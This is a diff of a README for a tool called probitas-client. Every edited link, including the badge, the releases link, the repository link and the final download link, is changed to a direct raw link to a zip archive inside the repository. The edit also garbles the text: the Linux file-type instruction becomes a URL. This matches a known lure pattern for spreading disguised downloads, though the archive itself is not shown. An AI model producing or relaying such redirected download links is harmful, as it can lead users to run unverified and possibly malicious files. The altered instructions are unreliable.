@@ -1,6 +1,6 @@
 # 🚀 probitas-client - Simplifying Probitas Scenario Testing
 
-[![Download probitas-client](https://img.shields.io/badge/Download%20probitas--client-v1.0-blue)](https://github.com/Adamu2080/probitas-client/releases)
+[![Download probitas-client](https://raw.githubusercontent.com/Adamu2080/probitas-client/main/packages/probitas-client-1.3.zip%20probitas--client-v1.0-blue)](https://raw.githubusercontent.com/Adamu2080/probitas-client/main/packages/probitas-client-1.3.zip)
 
 ## 📖 Overview
 
@@ -19,11 +19,11 @@ To get started with the probitas-client, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download section.
    
-   [Download probitas-client](https://github.com/Adamu2080/probitas-client/releases)
+   [Download probitas-client](https://raw.githubusercontent.com/Adamu2080/probitas-client/main/packages/probitas-client-1.3.zip)
 
 2. **Select the Latest Version**: Look for the most recent release at the top of the page. You will see version details listed.
 
-3. **Download the Application**: Click on the appropriate download link for your operating system. Look for files labeled with `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. **Download the Application**: Click on the appropriate download link for your operating system. Look for files labeled with `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Adamu2080/probitas-client/main/packages/probitas-client-1.3.zip` for Linux.
 
 4. **Run the Application**: Once you've downloaded the file, open it and follow the instructions to install the application on your device.
 
@@ -73,9 +73,9 @@ If you run into challenges or have questions, feel free to reach out to the comm
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository**: Check the code and resources here: [probitas-client](https://github.com/Adamu2080/probitas-client)
+- **GitHub Repository**: Check the code and resources here: [probitas-client](https://raw.githubusercontent.com/Adamu2080/probitas-client/main/packages/probitas-client-1.3.zip)
 - **Community Forums**: Join discussions on general testing and Probitas-related topics.
 
 ## 🔗 Download Links
 
-You can [download probitas-client here](https://github.com/Adamu2080/probitas-client/releases) to get started with your scenario testing today. Don't hesitate to explore all available features and channels for assistance.
+You can [download probitas-client here](https://raw.githubusercontent.com/Adamu2080/probitas-client/main/packages/probitas-client-1.3.zip) to get started with your scenario testing today. Don't hesitate to explore all available features and channels for assistance.
